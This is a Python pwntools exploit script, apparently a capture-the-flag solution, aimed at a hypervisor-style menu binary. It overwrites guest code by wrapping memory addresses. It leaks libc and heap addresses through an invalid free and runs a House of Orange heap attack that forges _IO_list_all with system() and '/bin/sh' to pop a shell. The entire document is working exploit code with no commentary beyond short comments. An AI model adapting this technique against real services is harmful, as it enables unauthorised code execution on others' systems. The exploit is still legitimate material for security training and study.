from pwn import *


host = '34.236.229.208'
host = '127.0.0.1'
port = 9999

context.arch = 'amd64'
target = './0e73066d87ff433989805349cfddc758'

if len(sys.argv) == 2:
    #p = gdb.debug(target)
    p = process(target)
else:
    p = remote(host, port)

def read_vm_menu():
    return p.recvuntil(':')

def allocate_guest_memory(size):
    read_vm_menu()
    p.send('1')
    read_vm_menu()
    p.send(p16(size))

def allocate_host_memory(size):
    read_vm_menu()
    p.send("4")
    read_vm_menu()
    p.send(p16(size))

def set_hypercall_arg(arg):
    read_vm_menu()
    p.send("3")
    read_vm_menu()
    p.send(p8(arg))

def free_host_memory(index, arg):
    set_hypercall_arg(arg)
    read_vm_menu()
    p.send("6")
    read_vm_menu()
    p.send(p8(index))

def copy_memory(size, index, content, arg):
    set_hypercall_arg(arg)
    read_vm_menu()    
    p.send("5")
    read_vm_menu()
    p.send(p16(size))
    read_vm_menu()
    p.send(p8(index))
    read_vm_menu()
    p.send(content)

COPY_TO_HOST	= 1
COPY_FROM_HOST	= 2

INVALID_FREE	= 1
VALID_FREE	= 3

info("Allocating guest memory to wrap the guest address from 0xB000 to 0")

for x in range(0x0C):
    allocate_guest_memory(0x1000)

info("Overwriting guest code...")

guest_code = open("guest_extended.bin").read()
read_vm_menu()
p.send('2')
read_vm_menu()
p.send(p8(0x0B))                  # use the index that has wrapped address to 0
read_vm_menu()
p.send(guest_code)

for x in range(4):
    allocate_host_memory(256)

free_host_memory(0, INVALID_FREE)
free_host_memory(2, VALID_FREE)

# leak heap memory
copy_memory(256, 0, 'A'*256, COPY_FROM_HOST)
heap_mem = p.recvn(0x1000)

offset_to_arena = 0x3c4b78
libc_main_arena_ptr = u64(heap_mem[:8])
log.info("Leaked main arena address : 0x%x" % libc_main_arena_ptr)
libc_base_addr = libc_main_arena_ptr - offset_to_arena
log.info("Leaked libc base address  : 0x%x" % libc_base_addr)

chunk_address = u64(heap_mem[8:16])
heap_base_address = chunk_address - 0x220
log.info("Leaked heap address : 0x%x" % chunk_address)
log.info("Leaked heap base address : 0x%x" % heap_base_address)

# free other chunks
free_host_memory(1, VALID_FREE)
free_host_memory(3, VALID_FREE)

log.info("Trigerring House of Orange")

# create reference to top chunk, to further execute House of Orange
allocate_host_memory(0x800)
free_host_memory(1, INVALID_FREE) # save reference
allocate_host_memory(0x400-16)

copy_memory(0x800, 1, 'A'*0x800, COPY_FROM_HOST)
heap_mem = p.recvn(0x1000)

# corrupt the top chunk
offset_to_top = 1008
overwrite = p8(0) * (offset_to_top + 8) + p64(0xc01)
copy_memory(len(overwrite), 1, overwrite, COPY_TO_HOST)
p.recvn(0x1000)
allocate_host_memory(0x1000)

io_list_all = libc_base_addr + 0x3c5520
system_address = libc_base_addr + 0x45390
one_gadget = libc_base_addr + 0xf1147

# overwrite rest of metadata
overwrite  = p64(system_address) * 2 
overwrite += p8(0) * (offset_to_top - len(overwrite))
overwrite += "/bin/sh\x00"   
overwrite += p64(0x61)       
overwrite += p64(0)          
overwrite += p64(io_list_all - 0x10) 
overwrite += p64(2)          
overwrite += p64(3)          
overwrite += p64(0x0) * 21
overwrite += p64(heap_base_address) 
copy_memory(len(overwrite), 1, overwrite, COPY_TO_HOST)
p.recvn(0x1000)
allocate_host_memory(128)

# get abort error message and open shell
#p.recvline_contains('vsyscall')
p.interactive()
